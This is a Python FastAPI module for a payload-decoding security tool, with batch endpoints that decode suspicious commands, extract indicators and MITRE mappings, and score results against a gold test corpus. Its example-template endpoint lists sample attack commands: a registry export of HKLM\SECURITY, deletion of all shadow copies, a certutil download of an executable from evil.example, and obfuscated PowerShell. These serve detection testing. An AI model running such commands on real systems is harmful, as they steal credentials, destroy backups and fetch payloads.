"""Batch Analyst Testing — P3 (Feb 2026)

Accept a large payload set (CSV upload, JSON list, or raw newline-separated
text), run every row through the deterministic decode pipeline, and return
a compact CSV/JSON matrix so analysts can validate 50–500 payloads at once
without a single UI click.

Endpoints (all under /api):
  POST /batch/test           — multipart CSV OR application/json body
  POST /batch/test/json      — pure JSON body, returns JSON
  GET  /batch/test/example   — download a starter CSV template

Row schema in the output CSV:
    id, input_snippet, engine, confidence, verdict, chain_ops,
    mitre_ids, lolbins, iocs_ips, iocs_domains, iocs_urls,
    iocs_hashes, decoded_snippet, reached_shellcode, error
"""
from __future__ import annotations

import csv
import io
import json
import re
from typing import Any, Dict, List, Optional

from fastapi import (APIRouter, Depends, File, Form, HTTPException,
                     Response, UploadFile)
from pydantic import BaseModel, Field

from deps import get_current_user
from analysis_core import deterministic_best_decode

router = APIRouter()

_MAX_ROWS       = 500
_MAX_INPUT_CHAR = 20_000
_SNIPPET_LEN    = 200
_CSV_FIELDS     = [
    "id", "input_snippet", "engine", "confidence", "verdict",
    "chain_ops", "mitre_ids", "lolbins",
    "iocs_ips", "iocs_domains", "iocs_urls", "iocs_hashes",
    "decoded_snippet", "reached_shellcode", "error",
]


class BatchInJson(BaseModel):
    payloads: List[str] = Field(..., min_length=1)
    analysis_mode: str  = Field(default="balanced")
    include_full_output: bool = Field(default=False,
        description="If true, adds a `decoded_full` field per row (uncapped).")


# ─── Helpers ───────────────────────────────────────────────────────────
def _row_id(prefix: str, i: int) -> str:
    return f"{prefix}-{i+1:04d}"


def _snip(s: Optional[str], n: int = _SNIPPET_LEN) -> str:
    if not s:
        return ""
    s = re.sub(r"\s+", " ", s.strip())
    return s if len(s) <= n else s[: n - 1] + "…"


def _verdict_from_result(result: Dict[str, Any]) -> str:
    vc = result.get("verdict_card") or {}
    v  = (vc.get("verdict") or "").strip()
    if v:
        return v
    # Fallback — plain reached_shellcode implies malicious
    if result.get("reached_shellcode"):
        return "Malicious"
    if result.get("iocs") or result.get("mitre") or result.get("lolbas"):
        return "Suspicious"
    return "Unknown"


def _run_single(payload: str, analysis_mode: str) -> Dict[str, Any]:
    """Run one payload through the deterministic pipeline + enrichment.

    Returns a NORMALISED dict tailored to the batch schema — never raises."""
    payload = (payload or "").strip()
    if not payload:
        return {"error": "empty payload"}
    if len(payload) > _MAX_INPUT_CHAR:
        return {"error": f"payload > {_MAX_INPUT_CHAR} chars — please split"}
    try:
        r = deterministic_best_decode(payload, analysis_mode=analysis_mode)
    except Exception as e:  # noqa: BLE001
        return {"error": f"decode-exception: {type(e).__name__}: {e}"}

    # ── Post-decode enrichment (mirrors /api/decode/smart) ────────────
    output_txt = r.get("output") or ""
    scan_text  = f"{payload}\n{output_txt}"
    try:
        from operations import extract_iocs, mitre_map
        iocs  = extract_iocs(scan_text)
        mitre = mitre_map(scan_text)
    except Exception:
        iocs = {}
        mitre = []
    try:
        from lolbas import scan_lolbas
        lolbas = scan_lolbas(scan_text)
    except Exception:
        lolbas = []
    try:
        from evidence_extractor import build_verdict_card
        vc = build_verdict_card(
            input_text=payload,
            output_text=output_txt,
            chain=[{"op": s.get("op", ""), "args": s.get("args") or {}}
                   for s in (r.get("steps") or [])],
            corrupted_container=r.get("corrupted_container"),
        ) or {}
    except Exception:
        vc = {}

    verdict = (vc.get("verdict") or "").strip()
    if not verdict:
        if r.get("reached_shellcode"):
            verdict = "Malicious"
        elif iocs or mitre or lolbas:
            verdict = "Suspicious"
        else:
            verdict = "Unknown"

    steps = r.get("steps") or []
    return {
        "engine":            r.get("engine") or "unknown",
        "confidence":        int(vc.get("score") or round(min(1.0, r.get("score") or 0) * 100)),
        "verdict":           verdict,
        "chain_ops":         " → ".join(s.get("op", "") for s in steps if s.get("op")),
        "mitre_ids":         ",".join(sorted({m.get("id", "") for m in mitre if m.get("id")})),
        "lolbins":           ",".join(sorted({(l.get("name") or l.get("id") or "").strip()
                                              for l in lolbas
                                              if (l.get("name") or l.get("id"))})),
        "iocs_ips":          ",".join(iocs.get("ips") or []),
        "iocs_domains":      ",".join(iocs.get("domains") or []),
        "iocs_urls":         ",".join(iocs.get("urls") or []),
        "iocs_hashes":       ",".join([*(iocs.get("md5") or []),
                                       *(iocs.get("sha1") or []),
                                       *(iocs.get("sha256") or [])]),
        "decoded_snippet":   _snip(output_txt, 400),
        "decoded_full":      output_txt,
        "reached_shellcode": bool(r.get("reached_shellcode")),
        "error":             None,
    }


def _rows_to_csv(rows: List[Dict[str, Any]]) -> str:
    buf = io.StringIO()
    w = csv.DictWriter(buf, fieldnames=_CSV_FIELDS, extrasaction="ignore",
                       quoting=csv.QUOTE_ALL)
    w.writeheader()
    for r in rows:
        w.writerow({k: r.get(k, "") for k in _CSV_FIELDS})
    return buf.getvalue()


def _load_csv_bytes(raw: bytes) -> List[str]:
    """Accept CSVs shaped as:
       · single column, no header               → each row is a payload
       · header with a `payload` or `input` column → use that column
       · multi-column with `payload` alias      → same
    """
    text = raw.decode("utf-8-sig", errors="replace")
    # Heuristic: try DictReader if the file has a header with an
    # obvious payload column, else fall back to raw csv.reader.
    sample = text[:1000]
    lower = sample.lower()
    if ("payload" in lower or "input" in lower or "sample" in lower) and "," in sample:
        reader = csv.DictReader(io.StringIO(text))
        column = None
        for c in reader.fieldnames or []:
            if c and c.strip().lower() in ("payload", "input", "sample", "src", "raw"):
                column = c
                break
        if column:
            return [row.get(column, "").strip()
                    for row in reader if (row.get(column) or "").strip()]
    # Fallback — treat every line as a single-column payload
    lines: List[str] = []
    for row in csv.reader(io.StringIO(text)):
        if not row:
            continue
        cell = (row[0] or "").strip()
        if cell and cell.lower() not in ("payload", "input", "sample", "src", "raw"):
            lines.append(cell)
    return lines


# ─── Endpoints ─────────────────────────────────────────────────────────
@router.post("/batch/test")
async def batch_test_upload(
    file: UploadFile = File(..., description="CSV with a `payload` column, or single-column newline-separated payloads."),
    analysis_mode: str = Form(default="balanced"),
    format: str = Form(default="csv", description="csv | json"),
    user=Depends(get_current_user),
):
    """CSV/upload variant — returns a CSV attachment by default."""
    if analysis_mode not in ("fast", "balanced", "deep"):
        analysis_mode = "balanced"
    raw = await file.read()
    if not raw:
        raise HTTPException(status_code=422, detail="empty upload")

    filename = (file.filename or "").lower()
    if filename.endswith(".json"):
        try:
            data = json.loads(raw.decode("utf-8", errors="replace"))
        except Exception as e:
            raise HTTPException(status_code=422, detail=f"invalid JSON: {e}")
        if isinstance(data, dict) and "payloads" in data:
            payloads = data["payloads"]
        elif isinstance(data, list):
            payloads = data
        else:
            raise HTTPException(status_code=422,
                detail="JSON must be a list or an object with a `payloads` array")
        payloads = [str(p) for p in payloads if str(p).strip()]
    else:
        payloads = _load_csv_bytes(raw)

    payloads = payloads[:_MAX_ROWS]
    if not payloads:
        raise HTTPException(status_code=422,
                            detail="no payloads found in upload — expected a CSV "
                                   "with a `payload` column or single-column rows")

    rows = []
    for i, p in enumerate(payloads):
        base   = {"id": _row_id("row", i), "input_snippet": _snip(p)}
        result = _run_single(p, analysis_mode)
        base.update(result)
        rows.append(base)

    if format == "json":
        return {"total": len(rows), "analysis_mode": analysis_mode, "rows": rows}
    csv_body = _rows_to_csv(rows)
    fname = re.sub(r"[^A-Za-z0-9._-]+", "_",
                   filename.rsplit(".", 1)[0] or "batch") + "_nivxray_results.csv"
    return Response(
        content=csv_body,
        media_type="text/csv",
        headers={"Content-Disposition": f'attachment; filename="{fname}"'},
    )


@router.post("/batch/test/json")
async def batch_test_json(body: BatchInJson, user=Depends(get_current_user)):
    """Pure-JSON variant — for programmatic tools that don't want a CSV file."""
    mode = body.analysis_mode if body.analysis_mode in ("fast", "balanced", "deep") else "balanced"
    payloads = [p for p in body.payloads if p and p.strip()][:_MAX_ROWS]
    if not payloads:
        raise HTTPException(status_code=422, detail="no payloads")
    rows = []
    for i, p in enumerate(payloads):
        base   = {"id": _row_id("row", i), "input_snippet": _snip(p)}
        result = _run_single(p, mode)
        base.update(result)
        if not body.include_full_output:
            base.pop("decoded_full", None)
        rows.append(base)
    return {
        "total": len(rows),
        "analysis_mode": mode,
        "rows": rows,
        "summary": {
            "malicious":  sum(1 for r in rows if r.get("verdict") == "Malicious"),
            "suspicious": sum(1 for r in rows if r.get("verdict") == "Suspicious"),
            "unknown":    sum(1 for r in rows if r.get("verdict") == "Unknown"),
            "errors":     sum(1 for r in rows if r.get("error")),
            "shellcode_reached": sum(1 for r in rows if r.get("reached_shellcode")),
        },
    }


@router.get("/batch/test/example")
async def batch_test_example(user=Depends(get_current_user)):
    """Download a starter CSV template with 5 example payloads."""
    examples = [
        ("row-0001", "powershell -EncodedCommand VwByAGkAdABlAC0ASABvAHMAdAAgACcAYgBlAG4AaQBnAG4AIABoAGUAbABsAG8AJwA="),
        ("row-0002", r"reg.exe export HKLM\SECURITY C:\Windows\Temp\sec.reg /y"),
        ("row-0003", "vssadmin delete shadows /all /quiet"),
        ("row-0004", "certutil -urlcache -split -f http://evil.example/x.exe C:\\temp\\x.exe"),
        ("row-0005", "cmd /c \"set p1=power&& set p2=shell&& cmd /c echo Write-Host SUCCESS ^| %p1%%p2% -\""),
    ]
    buf = io.StringIO()
    w = csv.writer(buf, quoting=csv.QUOTE_ALL)
    w.writerow(["id", "payload"])
    for i, p in examples:
        w.writerow([i, p])
    return Response(
        content=buf.getvalue(),
        media_type="text/csv",
        headers={"Content-Disposition":
                 'attachment; filename="nivxray_batch_example.csv"'},
    )


# ─── NXGEC Gold Corpus evaluator (Feb 2026) ────────────────────────────
# Runs the pre-imported /app/backend/tests/fixtures/nxgec.jsonl fixture
# through the deterministic pipeline and diffs actual vs. expected
# (MITRE T-IDs, LOLBins, severity, decode-chain presence). Read-only.

_NXGEC_PATH = "/app/backend/tests/fixtures/nxgec.jsonl"

def _load_nxgec():
    if not __import__("os").path.exists(_NXGEC_PATH):
        return []
    with open(_NXGEC_PATH, encoding="utf-8") as f:
        return [__import__("json").loads(line) for line in f if line.strip()]


def _diff_row(actual: Dict[str, Any], case: Dict[str, Any]) -> Dict[str, Any]:
    """Compare a single decoded row against its expected labels.
    Returns pass_flags + a compact diff summary for the UI."""
    exp_mitre = set(case.get("expected_mitre_ids") or [])
    got_mitre = set(m.strip() for m in (actual.get("mitre_ids") or "").split(",") if m.strip())
    exp_lol   = set(l.lower() for l in (case.get("expected_lolbins") or []))
    got_lol   = set(l.lower() for l in (actual.get("lolbins") or "").split(",") if l.strip())
    # MITRE prefix match (T1059 covers T1059.001, etc.)
    def _covers(exp: set, got: set) -> bool:
        for e in exp:
            if e in got:
                continue
            base = e.split(".")[0]
            if any(g == e or g.startswith(base + ".") or g == base for g in got):
                continue
            return False
        return True
    mitre_ok = _covers(exp_mitre, got_mitre) if exp_mitre else True
    lol_ok   = (exp_lol.issubset(got_lol)) if exp_lol else True
    sev_exp  = (case.get("expected_severity") or "").lower()
    got_verdict = (actual.get("verdict") or "").lower()
    # Simple severity↔verdict map
    _SEVMAP = {"critical": "malicious", "high": "malicious",
               "medium": "suspicious", "low": "suspicious",
               "informational": "unknown", "benign": "unknown"}
    sev_ok = (not sev_exp) or (_SEVMAP.get(sev_exp, "") in got_verdict) or (sev_exp in got_verdict)
    return {
        "mitre_ok":   mitre_ok,
        "lolbin_ok":  lol_ok,
        "severity_ok": sev_ok,
        "expected_mitre":  sorted(exp_mitre),
        "got_mitre":       sorted(got_mitre),
        "expected_lolbin": sorted(exp_lol),
        "got_lolbin":      sorted(got_lol),
        "expected_severity": sev_exp,
        "got_verdict":       got_verdict,
    }


@router.get("/batch/evaluate/nxgec")
async def nxgec_summary(user=Depends(get_current_user)):
    """Lightweight endpoint — returns just the corpus metadata without
    running it (fast, cache-friendly). Use POST to actually run."""
    cases = _load_nxgec()
    from collections import Counter
    return {
        "total": len(cases),
        "per_volume": dict(Counter(c.get("volume") for c in cases)),
        "categories": sorted({c.get("category") or "?" for c in cases}),
    }


@router.post("/batch/evaluate/nxgec")
async def nxgec_run(volume: Optional[int] = None,
                    limit: Optional[int] = None,
                    analysis_mode: str = "balanced",
                    user=Depends(get_current_user)):
    """Run the Gold Corpus against the deterministic pipeline.

    Query params:
      volume         — restrict to a single volume 1..10 (None = all)
      limit          — max cases to run (None = all)
      analysis_mode  — fast | balanced | deep
    """
    cases = _load_nxgec()
    if not cases:
        raise HTTPException(status_code=503, detail="nxgec fixture missing — "
                            "run `python -m tests.fixtures.import_nxgec` first.")
    if volume is not None:
        cases = [c for c in cases if c.get("volume") == volume]
    if limit:
        cases = cases[:max(1, min(500, limit))]
    if not cases:
        raise HTTPException(status_code=404, detail="no cases match filters")

    if analysis_mode not in ("fast", "balanced", "deep"):
        analysis_mode = "balanced"

    rows: List[Dict[str, Any]] = []
    passed = 0
    for c in cases:
        actual = _run_single(c["input"], analysis_mode)
        actual["id"]            = c.get("id")
        actual["title"]         = c.get("title")
        actual["volume"]        = c.get("volume")
        actual["category"]      = c.get("category")
        actual["input_snippet"] = _snip(c.get("input", ""), _SNIPPET_LEN)
        diff = _diff_row(actual, c)
        actual["diff"] = diff
        actual["overall_pass"] = bool(diff["mitre_ok"] and diff["lolbin_ok"] and diff["severity_ok"])
        if actual["overall_pass"]:
            passed += 1
        rows.append(actual)

    per_volume = {}
    for r in rows:
        v = r.get("volume") or 0
        s = per_volume.setdefault(v, {"total": 0, "pass": 0})
        s["total"] += 1
        if r.get("overall_pass"):
            s["pass"] += 1

    return {
        "total":       len(rows),
        "passed":      passed,
        "failed":      len(rows) - passed,
        "pass_rate":   round(passed * 100 / len(rows), 1) if rows else 0.0,
        "per_volume":  per_volume,
        "rows":        rows,
    }
